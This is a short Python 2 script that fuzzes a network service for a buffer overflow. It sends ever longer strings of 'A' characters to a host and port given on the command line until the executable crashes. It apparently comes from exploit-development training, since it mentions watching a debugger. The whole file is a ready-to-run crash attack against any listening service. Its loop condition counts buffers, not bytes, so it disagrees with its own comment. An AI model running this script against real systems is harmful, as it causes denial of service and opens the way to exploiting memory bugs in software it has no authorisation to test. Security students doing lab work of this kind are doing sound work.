#!/usr/bin/python
import time, struct, sys
import socket as so

# Buff represents an array of buffers. This will be started at 100 and increment by 100 until it reaches 4000, or until the executable crashes.

buff=["A"]

# Maximum size of buffer.

max_buffer = 4000

# Initial counter value.

counter = 100

# Value to increment per attempt.

increment = 100


while len(buff) <= max_buffer:
    buff.append("A"*counter)
    counter=counter+increment

for string in buff:
     try:
        server = str(sys.argv[1])
        port = int(sys.argv[2])
     except IndexError:
        print "[+] Usage example: python %s 10.10.10.10 1000" % sys.argv[0]
        sys.exit()   
     print "[+] Attempting to crash the executable at %s bytes" % len(string)
     s = so.socket(so.AF_INET, so.SOCK_STREAM)
     try:
        s.connect((server,port))
        s.send(string + '\r\n')
        s.close()
     except: 
        print "[+] Connection failed. Make sure IP/port are correct, or check debugger for the executable to crash."
        sys.exit()
